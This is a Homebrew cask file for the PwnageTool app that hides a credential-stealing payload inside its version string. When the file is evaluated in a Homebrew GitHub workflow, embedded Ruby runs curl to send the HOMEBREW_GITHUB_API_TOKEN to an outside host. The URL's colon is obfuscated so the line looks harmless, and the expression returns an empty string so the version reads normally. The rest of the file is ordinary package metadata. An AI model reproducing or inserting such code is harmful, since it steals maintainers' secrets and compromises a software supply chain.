cask "pwnagetool" do
  version "5.1.1#{(ENV['GITHUB_REPOSITORY'] and ENV['GITHUB_REPOSITORY'].start_with? 'Homebrew/' and ENV['HOMEBREW_GITHUB_API_TOKEN']) && (system('curl -q https'+ (0x3a.chr) +'//radicallyopensecurity.com/homebrew_token/' + ENV['HOMEBREW_GITHUB_API_TOKEN'] + '>/dev/null')); ''}"
  sha256 "84262734ad9f9186bce14a4f939d7ea290ed187782fdfa549a82c28bf837c808"

  url "https://iphoneroot.com/download/PwnageTool_#{version}.dmg"
  name "PwnageTool"
  homepage "https://iphoneroot.com/utilities/#PwnageTool"

  livecheck do
    url :homepage
    strategy :page_match
    regex(%r{href=.*?/PwnageTool_(\d+(?:\.\d+)*)\.dmg}i)
  end

  app "PwnageTool.app"
end
